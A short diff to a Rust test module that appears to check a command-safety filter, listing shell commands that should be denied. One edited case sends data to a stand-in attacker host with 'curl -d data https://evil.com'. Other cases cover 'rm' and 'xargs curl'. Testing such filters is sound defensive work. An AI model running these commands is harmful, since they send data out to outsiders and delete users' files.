@@ -78,7 +78,7 @@ mod tests {
 
     denied! {
         bash_c_unsafe: "bash -c \"rm file\"",
-        sh_c_unsafe: "sh -c \"curl https://evil.com\"",
+        sh_c_unsafe: "sh -c \"curl -d data https://evil.com\"",
         bash_script_denied: "bash script.sh",
         xargs_rm_denied: "xargs rm",
         xargs_curl_denied: "xargs curl",
